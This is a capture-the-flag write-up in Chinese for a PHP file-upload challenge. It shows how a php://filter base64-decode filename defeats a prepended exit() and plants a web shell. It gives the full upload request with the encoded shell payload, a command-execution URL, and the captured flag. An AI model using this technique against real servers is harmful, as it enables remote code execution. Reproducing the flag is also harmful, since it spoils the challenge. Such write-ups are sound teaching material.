# 题目描述

It's as easy as it looks, isn't it?

# 解决方案

首页源码如下：

```php
<?php
error_reporting(0);
if (isset($_POST['submit'])) {
    $file_name = urldecode($_FILES['file']['name']);
    $tmp_path = $_FILES['file']['tmp_name'];
    if(strpos($file_name, ".jpg") == false){
        echo "Invalid file name";
        exit(1);
    }
    $content = file_get_contents($tmp_path);
    $all_content = '<?php exit(0);'. $content . '?>';
    $handle = fopen($file_name, "w");
    fwrite($handle, $all_content);
    fclose($handle);
    echo "Done.";
}
else{
    show_source(__FILE__);
}
?>
```

这里需要绕过exit，不然注入的代码无法执行，绕过是借助php伪协议进行的，文件名设置为：php://filter/write=convert.base64-decode/resource=shell.jpg.php，即借助base64-decode去除<、?、(、)等特殊符号，然后写入注入php代码的base64编码值即可，文件名需要urlencode后发送，上传请求体如下：

```
POST / HTTP/1.1
Host: challenge.nahamcon.com:30484
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 459
Content-Type: multipart/form-data; boundary=0b2ce7c036cf945ba1b0a527fac43170

--0b2ce7c036cf945ba1b0a527fac43170
Content-Disposition: form-data; name="submit"

1
--0b2ce7c036cf945ba1b0a527fac43170
Content-Disposition: form-data; name="file"; filename="%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%77%72%69%74%65%3d%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%73%68%65%6c%6c%2e%6a%70%67%2e%70%68%70"

PD9waHAgc3lzdGVtKCRfR0VUWydzaGVsbCddKTs/Pg==

--0b2ce7c036cf945ba1b0a527fac43170—
```

上面的base64内容解码后为：`<?php system($_GET['shell']);?>`

上传后访问如下地址：

http://challenge.nahamcon.com:30483/shell.jpg.php?shell=cat%20/home/user/flag.txt

拿到flag：flag{ab5f69d6cc412345387a0ca3a4700398}
